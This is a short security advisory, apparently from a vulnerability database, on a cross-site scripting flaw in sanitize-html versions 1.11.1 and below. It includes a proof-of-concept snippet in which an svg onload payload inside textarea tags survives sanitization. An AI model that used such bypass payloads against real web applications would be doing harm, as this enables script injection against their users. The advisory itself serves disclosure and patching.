title: Cross Site Scripting
overview: Sanitize-html is a library for scrubbing html input of malicious values.        Versions 1.11.1 and below are vulnerable to cross site scripting (XSS) in certain scenarios:        If allowed at least one nonTextTags, the result is a potential XSS vulnerability.    PoC:        ```    var sanitizeHtml = require(sanitize-html);        var dirty = !<textarea></textarea><svg/onload=prompt`xs`></textarea>!;    var clean = sanitizeHtml(dirty, {        allowedTags: [ textarea ]    });        console.log(clean);        // !<textarea></textarea><svg/onload=prompt`xs`></textarea>!    ```
